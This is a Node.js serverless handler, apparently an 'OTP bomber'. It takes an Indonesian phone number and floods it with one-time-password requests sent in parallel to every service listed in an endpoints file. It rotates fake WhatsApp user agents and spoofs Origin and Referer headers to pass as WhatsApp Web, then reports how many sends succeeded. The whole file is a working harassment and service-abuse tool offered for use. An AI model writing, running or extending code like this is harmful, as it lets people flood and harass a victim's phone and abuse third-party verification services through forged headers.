const fetch = require('node-fetch');
const endpointsData = require('../endpoints.json');

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { phone, threads = 20 } = req.body;
  
  if (!phone || !/^[0-9]{10,15}$/.test(phone.replace(/^0/, ''))) {
    return res.status(400).json({ error: 'Nomor HP tidak valid' });
  }

  let targetNumber = phone.trim();
  if (targetNumber.startsWith('0')) {
    targetNumber = '+62' + targetNumber.substring(1);
  } else if (!targetNumber.startsWith('+62')) {
    targetNumber = '+62' + targetNumber;
  }

  const endpoints = endpointsData.endpoints;
  
  const sendOtp = async (ep) => {
    let url = ep.url;
    let bodyObj = JSON.parse(JSON.stringify(ep.body));
    const replaceInObject = (obj) => {
      for (let key in obj) {
        if (typeof obj[key] === 'string') obj[key] = obj[key].replace(/{nomor}/g, targetNumber);
        else if (typeof obj[key] === 'object') replaceInObject(obj[key]);
      }
    };
    replaceInObject(bodyObj);
    const body = JSON.stringify(bodyObj);
    
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 7000);
    
    // Rotasi User-Agent untuk WhatsApp
    const userAgents = [
      'WhatsApp/2.23.25.85 iOS/17.1.1',
      'WhatsApp/2.23.24.10 Android/14',
      'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) WhatsApp/2.23.24.10',
      'WhatsApp/2.23.25.80 iPhone OS/17.2'
    ];
    const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
    
    try {
      const response = await fetch(url, {
        method: ep.method || 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': randomUA,
          'Accept': 'application/json',
          'X-WhatsApp-Type': 'otp',
          'Origin': 'https://web.whatsapp.com',
          'Referer': 'https://web.whatsapp.com/'
        },
        body: body,
        signal: controller.signal
      });
      clearTimeout(timeoutId);
      
      let responseText = '';
      try { responseText = await response.text(); } catch(e) { responseText = ''; }
      
      return {
        service: ep.name,
        status: response.status,
        ok: response.ok,
        response: responseText.substring(0, 100)
      };
    } catch (err) {
      clearTimeout(timeoutId);
      return {
        service: ep.name,
        status: 0,
        ok: false,
        error: err.message
      };
    }
  };

  const maxConcurrent = Math.min(threads, 25);
  const results = [];
  
  for (let i = 0; i < endpoints.length; i += maxConcurrent) {
    const chunk = endpoints.slice(i, i + maxConcurrent);
    const chunkPromises = chunk.map(ep => sendOtp(ep));
    const chunkResults = await Promise.all(chunkPromises);
    results.push(...chunkResults);
    if (i + maxConcurrent < endpoints.length) await new Promise(r => setTimeout(r, 400));
  }

  const successful = results.filter(r => r.ok === true && r.status >= 200 && r.status < 300).length;
  const failed = results.length - successful;

  res.status(200).json({
    success: true,
    target: targetNumber,
    total_requests: results.length,
    successful: successful,
    failed: failed,
    details: results.map(r => ({
      service: r.service,
      status: r.status,
      ok: r.ok,
      ...(r.error ? { error: r.error } : {})
    }))
  });
};
